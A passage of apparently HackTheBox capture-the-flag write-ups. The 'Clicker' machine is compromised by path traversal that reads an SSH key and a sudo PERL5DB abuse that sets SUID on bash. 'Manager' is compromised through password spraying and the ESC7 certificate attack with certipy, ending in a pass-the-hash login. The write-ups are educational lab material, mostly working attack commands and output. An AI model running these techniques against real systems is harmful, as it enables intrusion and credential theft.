strncpy(pcVar3,&quot;populate.sql&quot;,0x14); break; case 3: strncpy(pcVar3,&quot;reset_password.sql&quot;,0x14); break; case 4: strncpy(pcVar3,&quot;clean.sql&quot;,0x14); break; default: strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14); }   There's a default option that would copy any provided value in param_2 into pcVar3   local_98 = 0x616a2f656d6f682f; local_90 = 0x69726575712f6b63; local_88 = 0x2f7365; sVar4 = strlen((char *)&amp;local_98); sVar5 = strlen(pcVar3); __dest = (char *)calloc(sVar5 + sVar4 + 1,1); strcat(__dest,(char *)&amp;local_98); strcat(__dest,pcVar3); setreuid(1000,1000); iVar1 = access(__dest,4); if (iVar1 == 0) { local_78 = 0x6e69622f7273752f; local_70 = 0x2d206c7173796d2f;   local_98 value corresponds to the string /home/jack. So, what it's doing this program is forcing the provided file is inside /home/jack folder, which we don't have access. However, we can read the private SSH key with this mechanism:  www-data@clicker:/opt/manage$ ./execute_query 5 ../.ssh/id_rsa mysql: [Warning] Using a password on the command line interface can be insecure. -------------- -----BEGIN OPENSSH PRIVATE KEY--- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn   Now we just need to adapt the private key format comparing with some valid private key and boom, we are in as jack:  ssh jack@clicker.htb -i ../exfil/priv_key   And we can read the user flag.  ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Clicker","url":"/docs/write-up/htb/machines/medium/clicker#privilege-escalation","content":" sudo -l shows interesting stuff:  User jack may run the following commands on clicker: (ALL : ALL) ALL (root) SETENV: NOPASSWD: /opt/monitor.sh   First of all, we try to run the monitoring script to see what happens:  jack@clicker:~$ sudo /opt/monitor.sh &lt;?xml version=&quot;1.0&quot;?&gt; &lt;data&gt;   An potential way to exploit this, is set the EUID to a number different than 0 so that it enters in the if when the user is not root:  #!/bin/bash if [ &quot;$EUID&quot; -ne 0 ] then echo &quot;Error, please run as root&quot; exit fi set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin unset PERL5LIB; unset PERLLIB;   The PATH is not well protected and if we provide the proper PATH variable, we can make echo program to point to our fradulent implementation ... Let's give it a try ...  Interesting, this technique does not seem to work with echo for some kind of reason but work with ls for instance. Looks like echo is a bult-in executable in the shell and does not use the PATH variable to determine where is it.  We can use PERL5OPT to set the debugger flag for perl and PERL5DB to specify the command we want to use as a debugger:  jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;ls&quot;);' /opt/monitor.sh queries user.txt   However, if we try to get a shell from here, we'll fail:  jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='system(&quot;/bin/bash&quot;);' /opt/monitor.sh /bin/bash: line 1: syntax error near unexpected token `newline' /bin/bash: line 1: `&lt;?xml version=&quot;1.0&quot;?&gt;' No DB::DB routine defined at /usr/bin/xml_pp line 9. No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870. END failed--call queue aborted.   But, we can do a nasty thing, we can set the SUID flag so that if keeps the root permission, even if the user is not root:  sudo PERL5OPT=-d PERL5DB='system(&quot;chmod u+s /bin/bash&quot;);' /opt/monitor.sh jack@clicker:~$ ls -la /bin/bash -rwsr-xr-x 1 root root 1396520 Jan 6 2022 /bin/bash   If we run bash normally we'll not get the root console:  jack@clicker:~$ bash bash-5.1$ whoami jack   However, there's a flag -p in bash to use the effective user id instead of the real user id:  jack@clicker:~$ bash -p bash-5.1# whoami root   And now we can read the root flag. ","version":"Next","tagName":"h2"},{"title":"Manager","type":0,"sectionRef":"#","url":"/docs/write-up/htb/machines/medium/manager","content":"","keywords":"","version":"Next"},{"title":"Enumeration​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#enumeration","content":" There are a lot of ports opened ...  └─$ nmap 10.10.11.236 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-02 20:09 CET Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Ping Scan Timing: About 50.00% done; ETC: 20:09 (0:00:02 remaining) Nmap scan report for 10.10.11.236 Host is up (0.045s latency). Not shown: 987 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain Simple DNS Plus Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Manager | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows PORT STATE SERVICE VERSION 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-03 01:14:27Z) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 139/tcp open netbios-ssn Microsoft Windows netbios-ssn Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-01-03T01:17:01+00:00; +5h59m52s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows 445/tcp open microsoft-ds? Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: 5h59m51s | smb2-time: | date: 2024-01-03T01:17:48 |_ start_date: N/A 464/tcp open kpasswd5 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 |_ssl-date: 2024-01-03T01:20:28+00:00; +5h59m52s from scanner time. Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 5h59m51s 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2024-01-03T01:21:19+00:00; +5h59m52s from scanner time. | ms-sql-info: | 10.10.11.236:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 10.10.11.236:1433: | Target_Name: MANAGER | NetBIOS_Domain_Name: MANAGER | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: manager.htb | DNS_Computer_Name: dc01.manager.htb | DNS_Tree_Name: manager.htb |_ Product_Version: 10.0.17763 | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-12-21T20:26:45 |_Not valid after: 2053-12-21T20:26:45 Host script results: |_clock-skew: mean: 5h59m51s, deviation: 0s, median: 5h59m51s 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) |_ssl-date: 2024-01-03T01:22:42+00:00; +5h59m53s from scanner time. | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 5h59m52s 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc01.manager.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:dc01.manager.htb | Not valid before: 2023-07-30T13:51:28 |_Not valid after: 2024-07-29T13:51:28 |_ssl-date: 2024-01-03T01:24:11+00:00; +5h59m52s from scanner time. Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows   Samba is open, so we can enumerate the shares:  └─$ smbclient -L \\\\dc01.manager.htb -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to dc01.manager.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available   ","version":"Next","tagName":"h2"},{"title":"Foothold​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#foothold","content":" We can use crackmapexec to brute-force the users:  ┌──(gal㉿gal)-[~/workspace/gal/htb] └─$ crackmapexec smb 10.10.11.236 -u anonymous -p &quot;&quot; --rid-brute 10000 SMB 10.10.11.236 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False) SMB 10.10.11.236 445 DC01 [+] manager.htb\\anonymous: SMB 10.10.11.236 445 DC01 [+] Brute forcing RIDs SMB 10.10.11.236 445 DC01 498: MANAGER\\Enterprise Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 500: MANAGER\\Administrator (SidTypeUser) SMB 10.10.11.236 445 DC01 501: MANAGER\\Guest (SidTypeUser) SMB 10.10.11.236 445 DC01 502: MANAGER\\krbtgt (SidTypeUser) SMB 10.10.11.236 445 DC01 512: MANAGER\\Domain Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 513: MANAGER\\Domain Users (SidTypeGroup) SMB 10.10.11.236 445 DC01 514: MANAGER\\Domain Guests (SidTypeGroup) SMB 10.10.11.236 445 DC01 515: MANAGER\\Domain Computers (SidTypeGroup) SMB 10.10.11.236 445 DC01 516: MANAGER\\Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 517: MANAGER\\Cert Publishers (SidTypeAlias) SMB 10.10.11.236 445 DC01 518: MANAGER\\Schema Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 519: MANAGER\\Enterprise Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 520: MANAGER\\Group Policy Creator Owners (SidTypeGroup) SMB 10.10.11.236 445 DC01 521: MANAGER\\Read-only Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 522: MANAGER\\Cloneable Domain Controllers (SidTypeGroup) SMB 10.10.11.236 445 DC01 525: MANAGER\\Protected Users (SidTypeGroup) SMB 10.10.11.236 445 DC01 526: MANAGER\\Key Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 527: MANAGER\\Enterprise Key Admins (SidTypeGroup) SMB 10.10.11.236 445 DC01 553: MANAGER\\RAS and IAS Servers (SidTypeAlias) SMB 10.10.11.236 445 DC01 571: MANAGER\\Allowed RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.236 445 DC01 572: MANAGER\\Denied RODC Password Replication Group (SidTypeAlias) SMB 10.10.11.236 445 DC01 1000: MANAGER\\DC01$ (SidTypeUser) SMB 10.10.11.236 445 DC01 1101: MANAGER\\DnsAdmins (SidTypeAlias) SMB 10.10.11.236 445 DC01 1102: MANAGER\\DnsUpdateProxy (SidTypeGroup) SMB 10.10.11.236 445 DC01 1103: MANAGER\\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias) SMB 10.10.11.236 445 DC01 1113: MANAGER\\Zhong (SidTypeUser) SMB 10.10.11.236 445 DC01 1114: MANAGER\\Cheng (SidTypeUser) SMB 10.10.11.236 445 DC01 1115: MANAGER\\Ryan (SidTypeUser) SMB 10.10.11.236 445 DC01 1116: MANAGER\\Raven (SidTypeUser) SMB 10.10.11.236 445 DC01 1117: MANAGER\\JinWoo (SidTypeUser) SMB 10.10.11.236 445 DC01 1118: MANAGER\\ChinHae (SidTypeUser) SMB 10.10.11.236 445 DC01 1119: MANAGER\\Operator (SidTypeUser)   So far, we found the following users:  zhongchengryanravenjinwoochinhaeoperator  We have a complete version number: Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)  Now we can do password spraying with the users:  crackmapexec smb 10.10.11.236 -u exfil/users -p exfil/users   And we found out the username and password for operator:  SMB 10.10.11.236 445 DC01 [+] manager.htb\\operator:operator   ","version":"Next","tagName":"h2"},{"title":"Lateral movement​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#lateral-movement","content":" With that user we cannot do much, if we try to connect with evil-winrm, we will get connection refused.  LDAP is opened, we can try to dump all the contents of it:  ldapdomaindump 10.10.11.236 -u 'manager.htb\\operator' -p 'operator' --no-json --no-grep   MS SQL is also open, so we can try to connect using the found user/password:  mssqlclient.py manager.htb/operator:operator@dc01.manager.htb -windows-auth Impacket v0.11.0 - Copyright 2023 Fortra [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(DC01\\SQLEXPRESS): Line 1: Changed database context to 'master'. [*] INFO(DC01\\SQLEXPRESS): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) [!] Press help for extra shell commands SQL (MANAGER\\Operator guest@master)&gt;   Here, it looks like we have permission to read the file structure:  SQL (MANAGER\\Operator guest@master)&gt; EXEC xp_dirtree 'C:\\inetpub\\wwwroot', 1, 1; subdirectory depth file ------------------------------- ----- ---- about.html 1 1 contact.html 1 1 css 1 0 images 1 0 index.html 1 1 js 1 0 service.html 1 1 web.config 1 1 website-backup-27-07-23-old.zip 1 1   Now we have two interesting files to check: web.config and website-backup ...  The web.config is protected, so we can't download it, however we are able to download the backup...  In the backup we can find the user and password for a user that is in the Remote Management Users which sounds good...  &lt;user&gt;raven@manager.htb&lt;/user&gt; &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;   With those credentials, we can use evil-winrm and get the user flag.  evil-winrm -i dc01.manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'   ","version":"Next","tagName":"h2"},{"title":"Privilege escalation​","type":1,"pageTitle":"Manager","url":"/docs/write-up/htb/machines/medium/manager#privilege-escalation","content":" Could not get it in time, but here's how it was done by another people: https://0xdf.gitlab.io/2024/03/16/htb-manager.html#box-info  After getting the user flag, a little bit of lurking around the machine did not provide anything interesting. So, we'll explore Active Directoy Certificate Service with certipy.  certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout [!] Vulnerabilities ESC7 : 'MANAGER.HTB\\\\Raven' has dangerous permissions   Nice, now we can explote this ESC7 vulnerability: ESC7 is when a user has either the &quot;Manage CA&quot; or &quot;Manage Certificates&quot; access rights on the certificate authority itself. Raven has ManageCa rights.  First, I’ll need to use the Manage CA permission to give Raven the Manage Certificates permission:  certipy ca -ca manager-DC01-CA -add-officer raven -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Successfully added officer 'Raven' on 'manager-DC01-CA'   Now raven appears in the find as certificate manager:  certipy find -dc-ip 10.10.11.236 -ns 10.10.11.236 -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout ...[snip]... ManageCertificates : MANAGER.HTB\\Administrators MANAGER.HTB\\Domain Admins MANAGER.HTB\\Enterprise Admins MANAGER.HTB\\Raven   Now, we will try to retrieve the Administrator certificate to connect with evil-winrm as administrator.  First: Request the admin cert:  certipy req -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC [-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. [*] Request ID is 13 Would you like to save the private key? (y/N) y [*] Saved private key to 13.key [-] Failed to request certificate   This fails, but we can keep the private key. Then, using the Manage CA and Manage Certificates privileges, I’ll use the ca subcommand to issue the request:  certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Successfully issued certificate   Now, the issued certificate can be retrieved using the req command:  certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Rerieving certificate with ID 13 [*] Successfully retrieved certificate [*] Got certificate with UPN 'administrator@manager.htb' [*] Certificate has no object SID [*] Loaded private key from '13.key' [*] Saved certificate and private key to 'administrator.pfx'   With this certificate as the administrator user, the easiest way to get a shell is to use it to get the NTLM hash for the user with the auth command. This requires the VM and target times to be in sync.  certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236 Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@manager.htb [*] Trying to get TGT... [*] Got TGT [*] Saved credential cache to 'administrator.ccache' [*] Trying to retrieve NT hash for 'administrator' [*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef   With the hash, we can connec to evil-winrm:  oxdf@hacky$ evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef Evil-WinRM shell v3.4 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt;   and grab the root.txt file ","version":"Next","tagName":"h2"}],"options":{"id":"default"}}